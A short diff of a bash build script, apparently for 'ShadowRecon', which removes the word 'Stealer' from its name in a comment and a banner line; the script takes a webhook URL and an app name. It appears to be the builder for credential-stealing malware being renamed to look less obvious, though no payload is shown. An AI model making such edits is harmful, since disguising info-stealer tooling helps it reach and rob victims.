@@ -1,9 +1,9 @@
 #!/bin/bash
 
-# ShadowRecon Stealer V3 - Build Script
+# ShadowRecon V3 - Build Script
 # Usage: ./build.sh <webhook_url> <app_name> [options]
 
-echo "🔥 ShadowRecon Stealer V3 - Modular Build System"
+echo "🔥 ShadowRecon V3 - Modular Build System"
 echo "========================================="
 
 # Check arguments
